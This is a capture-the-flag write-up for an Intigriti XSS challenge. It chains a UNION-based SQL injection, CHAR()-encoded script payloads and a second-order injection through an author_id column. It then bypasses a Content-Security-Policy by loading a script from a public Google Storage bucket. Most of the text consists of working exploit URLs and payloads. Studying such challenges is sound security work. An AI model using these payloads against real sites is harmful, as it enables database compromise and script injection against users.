XSS via SQL Injection by bypassing the csp

+ payload: https://challenge-0722.intigriti.io/challenge/challenge.php?month=0+or+1=1+--
+ to find the number of columns using union: https://challenge-0722.intigriti.io/challenge/challenge.php?month=0+union+select+1,2,3,4,5--
there are 5 columns.
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/1863cbe3-62da-4906-8063-e2d36827235e)
+ we can see that 2,3 and 5th column is getting reflected. giving xss alert payloads in those places still dont give us a popup.
+ even simple strings dont work. so there are a lot of string functions in mysql
  https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_char
+ lets try using those char() function and see if its getting reflected or not.
  payload: https://challenge-0722.intigriti.io/challenge/challenge.php?month=0+union+select+1,CHAR(77,121,83,81),3,4,5--
  ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/f54f7963-a1cc-4c1c-a8ae-c93201194ec7)
+ Lets try giving our xss payload inside this char() function and see if it works as intended.
  payload: https://challenge-0722.intigriti.io/challenge/challenge.php?month=0+union+select+1,CHAR(60,115,99,114,105,112,116,62,97,108,101,114,116,40,48,41,60,47,115,99,114,105,112,116,62),3,4,5--
  ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/50d84b61-4a3f-45bc-a9e0-e5dc1f51c51c)
  ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/3b671c7f-1b30-4b58-a46f-b9bac172de01)
  In the response we can see that even though the payload got reflected,  it appears that certain characters are filtered to prevent cross-site scripting.
+ Note: when we set the fourth column to 1 or 2, it changes the author between Anton and jake.
+ It’s possible that the author_id is being used in a later query to get the author’s name, hence this observed behaviour. And since we’ve already observed a SQL injection, it’s quite likely this further query isn’t properly parameterised either, and also vulnerable to injection.
So if we can cause the first query to return some malicious content for the author_id column, we can cause an injection into the second query.
+ the query can be something like this:SELECT id, name FROM authors WHERE id = 999 UNION SELECT 1,2;--
+ Script payload:
`<script>alert(document.domain)</script>`
+
Author payload:
999 UNION SELECT 1,CHAR(60,115,99,114,105,112,116,62,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,60,47,115,99,114,105,112,116,62),3
+
Initial payload:
999 UNION SELECT 1,2,3,CHAR(57,57,57,32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,67,72,65,82,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,44,57,55,44,49,48,56,44,49,48,49,44,49,49,52,44,49,49,54,44,52,48,44,49,48,48,44,49,49,49,44,57,57,44,49,49,55,44,49,48,57,44,49,48,49,44,49,49,48,44,49,49,54,44,52,54,44,49,48,48,44,49,49,49,44,49,48,57,44,57,55,44,49,48,53,44,49,49,48,44,52,49,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,44,51),5;--
+ But we get a csp error.
+ `Content-Security-Policy:
default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com`
+  it specifies that the only scripts that can run are those loaded from the origin, or from the three wildcarded domains
+  he *.googleapis.com domain is used to access public Google Storage buckets.
+   create a bucket using GCP, and add a simple javascript file (x.js) with the content:
`alert(document.domain)`
+ Setting it to public access, it becomes available at https://storage.googleapis.com/xssliamg/x.js, which matches the *.googleapis.com part of the CSP whitelist!
+ So, we now want to render the following HTML:

`<script src="https://storage.googleapis.com/xssliamg/x.js"></script>`
Final payload: `https://challenge-0722.intigriti.io/challenge/challenge.php?month=999%20UNION%20SELECT%201,2,3,CHAR(57,57,57,32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,67,72,65,82,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,51,50,44,49,49,53,44,49,49,52,44,57,57,44,54,49,44,51,52,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,49,49,53,44,53,56,44,52,55,44,52,55,44,49,49,53,44,49,49,54,44,49,49,49,44,49,49,52,44,57,55,44,49,48,51,44,49,48,49,44,52,54,44,49,48,51,44,49,49,49,44,49,49,49,44,49,48,51,44,49,48,56,44,49,48,49,44,57,55,44,49,49,50,44,49,48,53,44,49,49,53,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,50,48,44,49,49,53,44,49,49,53,44,49,48,56,44,49,48,53,44,57,55,44,49,48,57,44,49,48,51,44,52,55,44,49,50,48,44,52,54,44,49,48,54,44,49,49,53,44,51,52,44,54,50,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,44,51),5;--`
And yes we get the xss!


